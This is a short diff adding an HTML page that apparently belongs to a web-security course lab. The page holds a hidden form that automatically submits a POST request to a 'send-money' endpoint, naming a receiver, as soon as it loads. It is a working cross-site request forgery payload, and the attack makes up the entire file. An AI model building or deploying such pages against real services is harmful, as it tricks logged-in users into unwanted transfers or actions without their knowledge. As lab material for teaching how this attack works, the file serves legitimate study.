@@ -1,0 +1,8 @@
+<!DOCTYPE html>
+<html>
+<form method='POST' action='https://web2-lab2-psi.vercel.app/api/send-money' id="csrf-form">
+    <input type='hidden' name='delete' value='1'/>
+    <input type="hidden" name='receiver' value="Hrvoje">
+</form>
+<script>document.getElementById("csrf-form").submit()</script>
+</html>
